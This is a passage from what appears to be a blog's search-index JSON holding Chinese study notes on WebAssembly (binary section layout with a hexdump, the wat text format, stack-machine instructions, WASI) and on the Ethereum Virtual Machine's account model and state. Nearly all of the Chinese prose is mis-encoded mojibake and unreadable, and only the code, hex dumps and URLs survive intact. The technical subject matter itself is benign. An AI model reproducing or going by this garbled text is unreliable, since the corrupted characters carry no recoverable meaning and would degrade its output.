ç¼–è¯‘å™¨å‰ç«¯: å‰ç«¯ä¸»è¦è´Ÿè´£é¢„å¤„ç†ã€è¯ æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æï¼Œç”Ÿæˆä¾¿äºåç»­å¤„ç†çš„ä¸­é—´è¡¨ç¤º ç¼–è¯‘å™¨ä¸­ç«¯: ä¸­ç«¯å¯¹ä¸­é—´è¡¨ç¤ºè¿›è¡Œåˆ†æå’Œå„ç§ä¼˜åŒ– ç¼–è¯‘å™¨åç«¯: ç”Ÿæˆå¹³å°ç›®æ ‡ä»£ç  . æˆ‘ä»¬ä½¿ç”¨çš„rustup target add wasm32-wasi å°±æ˜¯å¢åŠ äº†ä¸€ä¸ªç¼–è¯‘å™¨åç«¯. https://doc.rust-lang.org/nightly/rustc/platform-support.html ","date":"2022-10-11","objectID":"/webassembly/:3:2","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":".wasmç»“æ„ WebAssemblyå¯¹åº”çš„æ–‡ä»¶.wasmæ˜¯ä¸€ç§ç´§å‡‘çš„äºŒè¿›åˆ¶æ ¼å¼, ä»¥ä¸Šé¢ä¾‹å­ä¸­çš„wasm_web_bg.wasmä¸ºä¾‹, çœ‹çœ‹è¿™ä¸ªäºŒè¿›åˆ¶æ˜¯å¦‚ä½•ç»„æˆçš„. WebAssemblyç¨‹åºè¢«ç»„ç»‡æˆæ¨¡å—ï¼Œå®ƒæ˜¯éƒ¨ç½²ã€åŠ è½½å’Œç¼–è¯‘çš„å•ä½ã€‚ä¸€ä¸ªæ¨¡å—æ”¶é›†äº†ç±»å‹ã€å‡½æ•°ã€è¡¨ã€å†…å­˜å’Œå…¨å±€å˜é‡çš„å®šä¹‰ã€‚æ­¤å¤–ï¼Œå®ƒå¯ä»¥å£°æ˜importå’Œexportï¼Œå¹¶ä»¥æ•°æ®å’Œå…ƒç´ æ®µçš„å½¢å¼æä¾›åˆå§‹åŒ–ï¼Œæˆ–æä¾›ä¸€ä¸ªå¯åŠ¨å‡½æ•°ã€‚ æ¨¡å—ç”± magic-number + version + Nä¸ªèŠ‚(Section)ç»„æˆ, å…¶ä¸­Sectionç”±ä»¥ä¸‹ä¸‰éƒ¨åˆ†ç»„æˆ: section id section å¤§å° sectionå®é™…å†…å®¹ Section Name Code Description Type 1 ç±»å‹éƒ¨åˆ†å£°æ˜äº†æ‰€æœ‰å°†åœ¨æ¨¡å—ä¸­ä½¿ç”¨çš„å‡½æ•°ç­¾åã€‚ Import 2 å¯¼å…¥éƒ¨åˆ†å£°æ˜äº†æ‰€æœ‰å°†åœ¨æ¨¡å—ä¸­ä½¿ç”¨çš„å¯¼å…¥ã€‚ Function 3 å‡½æ•°éƒ¨åˆ†å£°æ˜äº†æ¨¡å—ä¸­æ‰€æœ‰å‡½æ•°çš„ç­¾åï¼ˆå…¶å®šä¹‰å‡ºç°åœ¨ä»£ç éƒ¨åˆ†ï¼‰ Table 4 è¡¨éƒ¨åˆ†åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªä¸åŒçš„è¡¨çš„å®šä¹‰ Memory 5 çº¿æ€§å†…å­˜éƒ¨åˆ†æä¾›äº†ä¸€ä¸ªçº¿æ€§å†…å­˜çš„å†…éƒ¨å®šä¹‰ã€‚åœ¨MVPä¸­ï¼Œæ¯ä¸ªå†…å­˜éƒ½æ˜¯é»˜è®¤å†…å­˜ï¼Œæœ€å¤šå¯èƒ½æœ‰ä¸€ä¸ªçº¿æ€§å†…å­˜å¯¼å…¥æˆ–çº¿æ€§å†…å­˜å®šä¹‰ã€‚ Global 6 å…¨å±€éƒ¨åˆ†æä¾›äº†ä¸€ä¸ªé›¶ä¸ªæˆ–å¤šä¸ªå…¨å±€å˜é‡çš„å†…éƒ¨å®šä¹‰ã€‚ Export 7 å¯¼å‡ºå£°æ˜ Start 8 å¦‚æœæ¨¡å—å®šä¹‰äº†ä¸€ä¸ªå¼€å§‹éƒ¨åˆ†ï¼Œå®ƒæ‰€æŒ‡çš„å‡½æ•°åº”è¯¥åœ¨å®ä¾‹è¢«åˆå§‹åŒ–åè¢«åŠ è½½å™¨è°ƒç”¨ï¼ŒåŒ…æ‹¬å®ƒçš„å†…å­˜å’Œè¡¨è™½ç„¶æ•°æ®å’Œå…ƒç´ éƒ¨åˆ†ï¼Œå¹¶ä¸”åœ¨å¯¼å‡ºçš„å‡½æ•°å¯è¢«è°ƒç”¨ä¹‹å‰ã€‚ Element 9 å…ƒç´ éƒ¨åˆ†åŒ…å«ä¸€ä¸ªå¯èƒ½æ˜¯ç©ºçš„å…ƒç´ æ®µæ•°ç»„ï¼ŒæŒ‡å®šä¸€ä¸ªç»™å®šè¡¨çš„å›ºå®šï¼ˆåç§»é‡ï¼Œé•¿åº¦ï¼‰èŒƒå›´çš„åˆå§‹å†…å®¹ï¼Œç”±å…¶è¡¨ç´¢å¼•æŒ‡å®šã€‚ Code 10 ä»£ç éƒ¨åˆ†åŒ…å«æ¨¡å—ä¸­æ¯ä¸ªå‡½æ•°çš„ä¸»ä½“ã€‚åœ¨å‡½æ•°éƒ¨åˆ†å£°æ˜çš„å‡½æ•°å’Œåœ¨è¿™éƒ¨åˆ†å®šä¹‰çš„å‡½æ•°ä½“çš„æ•°é‡å¿…é¡»ç›¸åŒï¼Œç¬¬iä¸ªå£°æ˜å¯¹åº”ç¬¬iä¸ªå‡½æ•°ä½“ã€‚ Data 11 æ•°æ®éƒ¨åˆ†å£°æ˜äº†åŠ è½½åˆ°çº¿æ€§å­˜å‚¨å™¨ä¸­çš„åˆå§‹åŒ–æ•°æ®ã€‚ Name 0 è‡ªå®šä¹‰éƒ¨åˆ† æ›´å¤šçš„, å‚è€ƒè¿™é‡Œ https://webassembly.github.io/spec/core/binary/modules.html#binary-section ä½¿ç”¨ä»»æ„ä¸€ä¸ª16è¿›åˆ¶æŸ¥çœ‹å™¨æŸ¥çœ‹æˆ‘ä»¬ä¸Šé¢demoä¸­çš„wasm_web_bg.wasm OSX MP16 ~/Dow/wasm_e/wasm-web/pkg master ?12 â¯ hexdump -C ./wasm_web_bg.wasm 00000000 00 61 73 6d 01 00 00 00 01 0f 03 60 02 7f 7f 00 |.asm.......`....| 00000010 60 00 00 60 02 7f 7f 01 7f 02 24 01 03 77 62 67 |`..`......$..wbg| 00000020 1c 5f 5f 77 62 67 5f 61 6c 65 72 74 5f 62 35 30 |.__wbg_alert_b50| 00000030 61 33 64 37 33 35 34 65 31 34 39 62 37 00 00 03 |a3d7354e149b7...| 00000040 03 02 01 02 05 03 01 00 11 07 18 03 06 6d 65 6d |.............mem| 00000050 6f 72 79 02 00 05 67 72 65 65 74 00 01 03 61 64 |ory...greet...ad| 00000060 64 00 02 0a 15 02 0b 00 41 80 80 c0 00 41 10 10 |d.......A..ï¿½.A..| 00000070 00 0b 07 00 20 00 20 01 6a 0b 0b 19 01 00 41 80 |.... . .j.....A.| 00000080 80 c0 00 0b 10 48 65 6c 6c 6f 2c 20 77 61 73 6d |.ï¿½...Hello, wasm| 00000090 2d 77 65 62 21 00 7b 09 70 72 6f 64 75 63 65 72 |-web!.{.producer| 000000a0 73 02 08 6c 61 6e 67 75 61 67 65 01 04 52 75 73 |s..language..Rus| 000000b0 74 00 0c 70 72 6f 63 65 73 73 65 64 2d 62 79 03 |t..processed-by.| 000000c0 05 72 75 73 74 63 1d 31 2e 36 34 2e 30 20 28 61 |.rustc.1.64.0 (a| 000000d0 35 35 64 64 37 31 64 35 20 32 30 32 32 2d 30 39 |55dd71d5 2022-09| 000000e0 2d 31 39 29 06 77 61 6c 72 75 73 06 30 2e 31 39 |-19).walrus.0.19| 000000f0 2e 30 0c 77 61 73 6d 2d 62 69 6e 64 67 65 6e 12 |.0.wasm-bindgen.| 00000100 30 2e 32 2e 38 33 20 28 65 62 61 36 39 31 66 33 |0.2.83 (eba691f3| 00000110 38 29 |8)| 00000112 æ•´ç†ä¸€ä¸‹: å‰8ä¸ªå­—èŠ‚æ˜¯magic number (.asm) å’Œ ç‰ˆæœ¬ åé¢çš„æ˜¯Nä¸ªSection, sectionçš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯IDå·, ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯è¯¥sectionçš„é•¿åº¦(16è¿›åˆ¶, å®é™…å†…å®¹é•¿åº¦) æ¯”å¦‚ 01 0F 03 60 02 7F 7F 00 60 00 00 60 02 7F 7F 01 7F è¡¨ç¤ºsection id æ˜¯ 01, ä¹Ÿå°±æ˜¯ Type section, é•¿åº¦ä¸º0F (15), å®é™…å†…å®¹å°±æ˜¯åé¢ç´§è·Ÿç€çš„15ä¸ªå­—èŠ‚03 60 02 7F 7F 00 60 00 00 60 02 7F 7F 01 7F å†…å®¹æ˜¯å‡½æ•°å£°æ˜: 03è¡¨ç¤º 3ä¸ªå‡½æ•°å£°æ˜, 60 02 7F 7F 00 è¡¨ç¤ºä¸€ä¸ªå‡½æ•°å£°æ˜, 60 æ˜¯å‡½æ•°å£°æ˜æ ‡è®°, åé¢æ˜¯å‚æ•°æ•°é‡02,è¡¨ç¤ºæœ‰ä¸¤ä¸ªå‚æ•°,åˆ†åˆ«æ˜¯7F 7F ( 7Fè¡¨ç¤ºi32) æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å‡½æ•°è¿”å›å€¼ç±»å‹, 00è¡¨ç¤ºæ²¡æœ‰è¿”å›å€¼ 60 00 00 è¡¨ç¤ºå‚æ•°æ•°é‡ä¸º0, ä¹Ÿæ²¡æœ‰è¿”å›å€¼ 60 02 7F 7F 01 7F è¡¨ç¤ºæœ‰2ä¸ª7F(i32)ç±»å‹çš„å‚æ•°, è¿”å›å€¼æœ‰1ä¸ª, ç±»å‹ä¹Ÿæ˜¯7F ","date":"2022-10-11","objectID":"/webassembly/:3:3","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"WebAssembly æ–‡æœ¬æ ¼å¼(wat) ä¸Šé¢çš„äºŒè¿›åˆ¶æ ¼å¼äººç±»é˜…è¯»èµ·æ¥æ˜¯éå¸¸ç—›è‹¦çš„, æ‰€ä»¥WebAssemblyè¿˜æä¾›äº†æ–‡æœ¬æ ¼å¼, å¯¹åº”çš„åç¼€åæ˜¯.wat (WebAssembly Text) å°†.wasmè½¬æ¢ä¸º.watéœ€è¦ç”¨åˆ° wabt å·¥å…·åŒ…ä¸­çš„ wasm2wat OSX MP16 ~/Dow/wasm_e/wasm-web/pkg master ?12 â¯ wasm2wat ./wasm_web_bg.wasm (module (type (;0;) (func (param i32 i32))) (type (;1;) (func)) (type (;2;) (func (param i32 i32) (result i32))) (import \"wbg\" \"__wbg_alert_b50a3d7354e149b7\" (func (;0;) (type 0))) (func (;1;) (type 1) i32.const 1048576 i32.const 16 call 0) (func (;2;) (type 2) (param i32 i32) (result i32) local.get 0 local.get 1 i32.add) (memory (;0;) 17) (export \"memory\" (memory 0)) (export \"greet\" (func 1)) (export \"add\" (func 2)) (data (;0;) (i32.const 1048576) \"Hello, wasm-web!\")) åœ¨MDNä¸Šæœ‰è¯¥æ ¼å¼çš„è¯¦ç»†è§£é‡Š: https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format ","date":"2022-10-11","objectID":"/webassembly/:3:4","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"Stack Machine Wasmè§„èŒƒå®é™…ä¸Šä¹Ÿå®šä¹‰äº†ä¸€ å°æ¦‚å¿µä¸Šçš„æ ˆå¼è™šæ‹Ÿæœº, ç»å¤§å¤šæ•°çš„WasmæŒ‡ä»¤éƒ½æ˜¯åŸº äºä¸€ä¸ªè™šæ‹Ÿæ ˆå·¥ä½œ:ä»æ ˆé¡¶å¼¹å‡ºè‹¥å¹²ä¸ªæ•°ï¼Œè¿›è¡Œè®¡ ç®—ï¼Œç„¶åæŠŠç»“æœå‹æ ˆã€‚ç”±äºé‡‡ç”¨äº†æ ˆå¼è™šæ‹Ÿæœºï¼Œå¤§éƒ¨åˆ†WasmæŒ‡ä»¤(ç‰¹åˆ« æ˜¯æ•°å€¼æŒ‡ä»¤)éƒ½å¾ˆçŸ­ï¼Œåªæœ‰ä¸€ä¸ªæ“ä½œç ï¼Œè¿™æ˜¯å› ä¸ºæ“ ä½œæ•°å·²ç»éšå«åœ¨æ ˆä¸Šäº†ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œi32.addæŒ‡ä»¤åªæœ‰ ä¸€ä¸ªæ“ä½œç 0x6Aã€‚åœ¨æ‰§è¡Œæ—¶ï¼Œè¿™æ¡æŒ‡ä»¤ä»æ ˆé¡¶å¼¹å‡ºä¸¤ ä¸ªi32ç±»å‹çš„æ•´æ•°ï¼Œè¿™ä¸¤ä¸ªæ•´æ•°ç›¸åŠ ï¼Œç„¶åæŠŠç»“æœ(ä¹Ÿæ˜¯i32ç±»å‹)å‹æ ˆ. æ¯”å¦‚è®¡ç®— $$ \\begin{align*} f(x) = 2x^2 + 1 \\end{align*} $$ å¯¹åº”çš„wat (func $f (param $x i32) (result i32) ;; stack: [] (get_local $x) ;; stack: [x] (get_local $x) ;; stack: [x, x] (i32.mul) ;; stack: [x*x] (i32.const 2) ;; stack: [2, x*x] (i32.mul) ;; stack: [2*x*x] (i32.const 1) ;; stack: [1, 2*x*x] (i32.add)) ;; stack: [2*x*x+1] ) WebAssemblyä¸­çš„å¤§å¤šæ•°æŒ‡ä»¤éƒ½ä»¥æŸç§æ–¹å¼ä¿®æ”¹å€¼æ ˆã€‚åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œget_localæŠŠå‚æ•°xæ¨åˆ°æ ˆä¸Šã€‚i32.mulä»æ ˆä¸Šå¼¹å‡ºä¸¤ä¸ªå€¼ï¼ŒæŠŠå®ƒä»¬ç›¸ä¹˜ï¼Œç„¶åæŠŠç»“æœæ¨å›æ ˆä¸Šã€‚i32.const NæŠŠå€¼Næ¨åˆ°æ ˆä¸Šã€‚è¯¥å‡½æ•°éšå«åœ°è¿”å›å †æ ˆé¡¶éƒ¨çš„å€¼ã€‚ç†è®ºä¸Šï¼Œå½“ä»å·¦åˆ°å³å†™å †æ ˆæ—¶ï¼Œæœ€å·¦è¾¹çš„å€¼æ˜¯å †æ ˆçš„é¡¶éƒ¨ã€‚å¯¹äºéœ€è¦å¤šä¸ªå‚æ•°çš„æ“ä½œï¼Œå®ƒä»¬çš„é¡ºåºä¸ä»å †æ ˆä¸­å–å‡ºçš„é¡ºåºç›¸åã€‚ä¾‹å¦‚: (i32.const 1) (i32.const 2) (i32.sub) è¿™ä¸ªç¨‹åºè®¡ç®—å‡º1-2 æ³¨æ„ï¼Œè™½ç„¶æˆ‘ä»¬ä¸€ç›´åœ¨ä½¿ç”¨i32ï¼Œä½†WebAssemblyç†è§£ä¸åŒå¤§å°çš„æ•°å­—ç±»å‹ï¼ŒåŒ…æ‹¬æ•´æ•°ï¼ˆi8, i16, i32, i64, i128ï¼‰å’Œæµ®ç‚¹æ•°ï¼ˆf32, f64ï¼‰ã€‚ é‚£ä¹ˆ, æˆ‘ä»¬åœ¨ä¸Šä¸€èŠ‚ä¸­æºä»£ç  #[wasm_bindgen] pub fn add(a: i32, b: i32) -\u003e i32 { a + b } å¯¹åº”çš„watå°±å¾ˆå¥½ç†è§£äº†: è·å–2ä¸ªå±€éƒ¨å€¼å°†å…¶å‹æ ˆ, ç„¶åè°ƒç”¨æŒ‡ä»¤ i32.add ä»æ ˆä¸­å¼¹å‡º2ä¸ªå€¼è¿›è¡ŒåŠ æ³•æ“ä½œ, å¹¶å°†ç»“æœå‹æ ˆ (func (;2;) (type 2) (param i32 i32) (result i32) local.get 0 local.get 1 i32.add) æ›´å¤šæŒ‡ä»¤å‚è€ƒè¿™é‡Œ : åŒ…æ‹¬å¾ªç¯, æ¡ä»¶åˆ¤æ–­ç­‰ç°ä»£è¯­è¨€çš„åŸºæœ¬å…ƒç´ . https://github.com/sunfishcode/wasm-reference-manual/blob/master/WebAssembly.md#instruction-descriptions https://webassembly.github.io/spec/core/appendix/index-instructions.htm ","date":"2022-10-11","objectID":"/webassembly/:3:5","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"WASI ç¼–ç¨‹å°±ç»•ä¸å¼€å’Œç³»ç»Ÿæ‰“äº¤é“, æ¯”å¦‚æ–‡ä»¶ç³»ç»Ÿ, ç£ç›˜è¯»å†™, ç½‘ç»œé€šè®¯ç­‰. WebAssemblyä¹Ÿä¸€æ ·, ä½†å’Œå…¶å®ƒç¼–ç¨‹è¯­è¨€ä¸ä¸€æ ·çš„æ˜¯, WebAssemblyé¢å‘çš„æ˜¯ä¸€ä¸ªæ¦‚å¿µæ€§çš„æœºå™¨,ä»–éœ€è¦è·¨å„å¼å„æ ·çš„å¹³å°(å¯ç§»æ¤)å¹¶ä¿è¯å®‰å…¨æ€§. æ‰€ä»¥ä¾¿äº†ä»¥WASI (WebAssembly System Interface), ä½†å€¼å¾—æ³¨æ„çš„æ˜¯å…¶ä¸æ˜¯ä¸€ä¸ªå•ä¸€çš„æ ‡å‡†ç³»ç»Ÿæ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªæ ‡å‡†åŒ–çš„APIçš„æ¨¡å—åŒ–é›†åˆã€‚ è¿™ç¯‡æ–‡ç« è¯¦ç»†è§£é‡Šäº†ä¸ºä»€ä¹ˆéœ€è¦WASIä»¥åŠå¦‚ä½•å®ç°å’Œå®ç°ä¸­é‡åˆ°çš„é—®é¢˜: https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/ æ›´å¤šçš„å‚è€ƒè¿™é‡Œ https://github.com/WebAssembly/WASI ä¸€ä¸ªç®€å•çš„æ•™ç¨‹: https://github.com/bytecodealliance/wasmtime/blob/main/docs/WASI-tutorial.md æœ‰ä¸å°‘è¿è¡Œæ—¶(runtime)éƒ½æ”¯æŒWASI, å¯ä»¥åˆ° https://github.com/appcypher/awesome-wasm-runtimes ä¸­æŸ¥çœ‹ â€œHost APIs supportedâ€œå­—æ®µ ","date":"2022-10-11","objectID":"/webassembly/:3:6","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"ä¸€äº›å…³äºEVMçš„å­¦ä¹ ç¬”è®° ","date":"2022-10-06","objectID":"/evm/:0:0","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"ä»€ä¹ˆæ˜¯EVM åœ¨web3çš„çš„L0ä¸­, æ¶‰åŠåˆ°ä¸€ä¸ªæ¦‚å¿µ Platform neutral language (æœ‰äº›åœ°æ–¹ä¹Ÿå†™åš Platform-neutral computation description language ) å¹³å°ä¸­ç«‹çš„è®¡ç®—æè¿°è¯­è¨€, æŒ‡ä¸€ç§åœ¨ä¸åŒç‰©ç†å¹³å°ï¼ˆæ¶æ„ã€æ“ä½œç³»ç»Ÿç­‰ï¼‰ä¸Šæ‰§è¡Œç›¸åŒç¨‹åºçš„æ–¹æ³•ã€‚ æˆ‘ä»¬çŸ¥é“, ä»»ä½•ä¸€ä¸ªåŒºå—é“¾éƒ½éœ€è¦Nä¸ªèŠ‚ç‚¹æŒ‰ç…§ä¸€å®šçš„è§„åˆ™æ¥æ‰§è¡Œç›¸åŒçš„è¿ç®—, å¯ä»¥æƒ³è±¡æˆä¸€ä¸ªå¹³å°, è¿™ä¸ªå¹³å°å’Œç¡¬ä»¶ä»¥åŠç¼–ç¨‹è¯­è¨€éƒ½ä¸æ˜¯å¼ºç›¸å…³çš„, åœ¨ä»¥å¤ªåŠä¸­, å…¶é‡‡ç”¨äº†è™šæ‹Ÿæœºçš„å½¢å¼. å®ƒå’Œæˆ‘ä»¬å¹³æ—¶ç”¨çš„VMwareæœ‰äº›ç±»ä¼¼, ä½†åˆä¸åŒ, å› ä¸ºEVMæ˜¯åˆ†å¸ƒå¼çš„. å¦å¤–, æˆ‘ä»¬å¾ˆå¤šæ—¶å€™è®¨è®ºEVMæ›´å¤šçš„æ˜¯è¯´çš„ä¸€å¥—è§„åˆ™, è€Œä¸æ˜¯æŸä¸ªå…·ä½“çš„EVMå®ç°, EVMçš„å…·ä½“å®ç°æœ‰å¾ˆå¤š, æ¯”å¦‚golangå®ç°çš„go-ethereum , c++å®ç°çš„cpp-ethereum ç­‰ç­‰, æ›´å¤šçš„å‚è€ƒè¿™é‡Œ: https://github.com/pirapira/awesome-ethereum-virtual-machine ç®€è¨€ä¹‹, EVMæä¾›äº†ä¸€ä¸ªè™šæ‹Ÿçš„æ²™ç›’ç¯å¢ƒ, ä¸ºä»¥å¤ªåŠåŒºå—é“¾æä¾›äº† ä¸€ç³»åˆ—çš„åŠŸèƒ½ ","date":"2022-10-06","objectID":"/evm/:1:0","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"EVMçš„ä¸»è¦åŠŸèƒ½ ","date":"2022-10-06","objectID":"/evm/:2:0","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"åˆ†å¸ƒå¼æ•°æ®åº“ åœ¨å…¶æœ€åŸºæœ¬çš„å½¢å¼ä¸­ï¼Œä»¥å¤ªåŠè™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªå¤§å‹çš„åˆ†å¸ƒå¼æ•°æ®åº“ï¼Œ ç”¨äºä¿å­˜ä»¥å¤ªåŠçš„æ‰€æœ‰è´¦æˆ·å’Œä½™é¢ . æ³¨: ä»¥å¤ªåŠä½¿ç”¨çš„è´¦æˆ·/ä½™é¢æ¨¡å‹, è€Œä¸æ˜¯BTCçš„UTXO åŸºäºè´¦æˆ·çš„äº¤æ˜“æ¨¡å¼å°†èµ„äº§è¡¨ç¤ºä¸ºè´¦æˆ·å†…çš„ä½™é¢ï¼Œç±»ä¼¼äºé“¶è¡Œè´¦æˆ·ã€‚ä»¥å¤ªåŠä½¿ç”¨è¿™ç§äº¤æ˜“æ¨¡å¼ã€‚æœ‰ä¸¤ç§ä¸åŒç±»å‹çš„è´¦æˆ·: ç§é’¥æ§åˆ¶çš„ç”¨æˆ·è´¦æˆ· åˆçº¦ä»£ç æ§åˆ¶çš„è´¦æˆ·ã€‚ å½“ä½ åˆ›å»ºä¸€ä¸ªä»¥å¤ªå¸é’±åŒ…å¹¶æ”¶åˆ°ä½ çš„ç¬¬ä¸€ç¬”äº¤æ˜“æ—¶ï¼Œä¸€ä¸ªç§é’¥æ§åˆ¶çš„è´¦æˆ·è¢«æ·»åŠ åˆ°å…¨å±€çŠ¶æ€å¹¶å­˜å‚¨åœ¨ç½‘ç»œä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹ã€‚éƒ¨ç½²ä¸€ä¸ªæ™ºèƒ½åˆçº¦ä¼šå¯¼è‡´åˆ›å»ºä¸€ä¸ªä»£ç æ§åˆ¶çš„è´¦æˆ·ã€‚æ™ºèƒ½åˆçº¦å¯ä»¥è‡ªå·±æŒæœ‰èµ„é‡‘ï¼Œå®ƒä»¬å¯ä»¥æ ¹æ®åˆçº¦é€»è¾‘ä¸­å®šä¹‰çš„æ¡ä»¶é‡æ–°åˆ†é…ã€‚ä»¥å¤ªåŠçš„æ¯ä¸ªè´¦æˆ·éƒ½æœ‰ä¸€ä¸ªä½™é¢ã€å­˜å‚¨ç©ºé—´ï¼Œä»¥åŠç”¨äºè°ƒç”¨å…¶ä»–è´¦æˆ·æˆ–åœ°å€çš„ä»£ç ç©ºé—´ã€‚ åŸºäºè´¦æˆ·çš„æ¨¡å‹ä¸­çš„äº¤æ˜“ä¼šè§¦å‘èŠ‚ç‚¹å‡å°‘å‘é€æ–¹è´¦æˆ·çš„ä½™é¢ï¼Œå¢åŠ æ¥æ”¶æ–¹è´¦æˆ·çš„ä½™é¢ã€‚ä¸ºäº†é˜²æ­¢é‡æ”¾æ”»å‡»ï¼Œè´¦æˆ·æ¨¡å‹ä¸­çš„æ¯ç¬”äº¤æ˜“éƒ½é™„æœ‰ä¸€ä¸ªéæˆæƒç ã€‚é‡æ”¾æ”»å‡»æ˜¯æŒ‡å—æ¬¾äººå¹¿æ’­ä¸€ä¸ªæ¬ºè¯ˆæ€§çš„äº¤æ˜“ï¼Œä»–ä»¬åœ¨å…¶ä¸­è·å¾—ç¬¬äºŒæ¬¡ä»˜æ¬¾ã€‚å¦‚æœæ¬ºè¯ˆæ€§äº¤æ˜“æˆåŠŸï¼Œè¯¥äº¤æ˜“å°†è¢«ç¬¬äºŒæ¬¡æ‰§è¡Œâ€“å®ƒè¢«é‡æ”¾â€“å¹¶ä¸”å‘é€è€…å°†è¢«æ”¶å–ä¸¤å€äºä»–ä»¬æƒ³è¦è½¬ç§»çš„é‡‘é¢ã€‚ ä¸ºäº†æ‰“å‡»è¿™ç§è¡Œä¸ºï¼Œä»¥å¤ªåŠçš„æ¯ä¸ªè´¦æˆ·éƒ½æœ‰ä¸€ä¸ªå…¬å¼€çš„å¯æŸ¥çœ‹çš„nonceï¼Œè¯¥nonceåœ¨æ¯ç¬”æµå‡ºçš„äº¤æ˜“ä¸­éƒ½ä¼šè¢«é€’å¢1ã€‚è¿™å¯ä»¥é˜²æ­¢åŒä¸€äº¤æ˜“è¢«å¤šæ¬¡æäº¤ç»™ç½‘ç»œã€‚ åœ¨è´¦æˆ·æ¨¡å‹ä¸­ï¼Œäº¤æ˜“è´¹ç”¨çš„å·¥ä½œæ–¹å¼ä¹Ÿæœ‰æ‰€ä¸åŒã€‚å®ƒä»¬æ˜¯æ ¹æ®å®ŒæˆçŠ¶æ€è½¬æ¢æ‰€éœ€çš„è®¡ç®—æ¬¡æ•°æ¥è®¡ç®—çš„ã€‚ä»¥å¤ªåŠçš„å‡ºå‘ç‚¹æ˜¯æˆä¸ºä¸€ä¸ªä¸–ç•Œè®¡ç®—æœºã€‚å› æ­¤ï¼Œä»–ä»¬å†³å®šï¼Œè´¹ç”¨åº”è¯¥åŸºäºæ¶ˆè€—çš„è®¡ç®—èµ„æºæ•°é‡ï¼Œè€Œä¸æ˜¯æ‰€å ç”¨çš„å­˜å‚¨å®¹é‡ã€‚ è´¦æˆ·æ¨¡å‹å°†æ‰€æœ‰ä½™é¢ä½œä¸ºä¸€ä¸ªå…¨å±€çŠ¶æ€è¿›è¡Œè·Ÿè¸ªã€‚è¿™ä¸ªçŠ¶æ€å¯ä»¥ç†è§£ä¸ºæ‰€æœ‰è´¦æˆ·ã€ç§é’¥å’Œåˆçº¦ä»£ç çš„æ•°æ®åº“ï¼Œä»¥åŠä»–ä»¬åœ¨ç½‘ç»œä¸Šä¸åŒèµ„äº§çš„å½“å‰ä½™é¢çš„æ§åˆ¶ã€‚ ç”¨äºä¿å­˜æ™ºèƒ½åˆçº¦ ä»¥å¤ªåŠåœ¨é“¾ä¸Šæœ‰åˆçº¦ï¼ˆç§°ä¸ºæ™ºèƒ½åˆçº¦ï¼‰ï¼Œå³ä»£ç è¢«ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œäº§ç”Ÿçš„å­—èŠ‚åœ¨äº¤æ˜“ä¸­è¢«å‘é€ï¼Œä»¥åšæŒåˆ°ä»¥å¤ªåŠåŒºå—é“¾ä¸Šã€‚è¿™åœ¨ä½ éƒ¨ç½²æ™ºèƒ½åˆçº¦æ—¶å®Œæˆä¸€æ¬¡ã€‚åœ¨è¿™ä¹‹åï¼Œäººä»¬å¯ä»¥ä¸æ™ºèƒ½åˆçº¦ä¸å…¶ä»–äº¤æ˜“äº’åŠ¨ã€‚ æ³¨: å…³äºæ•°æ®å­˜å‚¨, ä»¥å¤ªåŠåŒºå—é“¾ä¸Šå¹¶ä¸é€‚åˆå¤§é‡æ•°æ®å­˜å‚¨, å‚è€ƒè¿™ç¯‡è®ºæ–‡: Exploring Ethereumâ€™s Data Stores: A Cost and Performance Comparison ","date":"2022-10-06","objectID":"/evm/:2:1","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"åˆ†å¸ƒå¼çŠ¶æ€æœº ä»åŸºæœ¬å±‚é¢ä¸Šè€Œè¨€, ETHåŒºå—é“¾æ˜¯ä¸€ä¸ªç”±äº¤æ˜“å’Œå…±è¯†é©±åŠ¨çš„çŠ¶æ€æœº, çŠ¶æ€éœ€è¦æ°¸ä¹…åœ°å­˜å‚¨åœ¨åŒºå—é“¾ä¸Š. éšç€äº¤æ˜“çš„è¿›è¡Œ, åŒºå—é“¾ä¼šä¸æ–­æ›´æ–°çŠ¶æ€, è¿™é‡Œçš„çŠ¶æ€æœ‰ä¸¤ç§: ä¸–ç•ŒçŠ¶æ€(World State): ä»¥å¤ªåŠåœ°å€å’Œè´¦æˆ·çŠ¶æ€çš„æ˜ å°„ è´¦æˆ·çŠ¶æ€(Account State): ç”±4ä¸ªå­—æ®µç»„æˆ Nonce: ä¸€ä¸ªå€¼, æ¯æ¬¡ä»è¯¥åœ°å€å‘é€äº¤æ˜“æ—¶éƒ½ä¼šé€’å¢ ä½™é¢: è¿™ä¸ªå€¼ä»£è¡¨weisçš„æ•°é‡ï¼Œweisæ˜¯ä»¥å¤ªåŠä¸­æœ€å°çš„è´§å¸å•ä½ï¼ˆweiï¼‰ï¼Œç”±ç»™å®šåœ°å€æŒæœ‰ Storage root : è¿™ä¸ªå­—æ®µä»£è¡¨ä¸€ä¸ªMPTçš„æ ¹èŠ‚ç‚¹ï¼Œç¼–ç è´¦æˆ·çš„å­˜å‚¨å†…å®¹ Code hash: 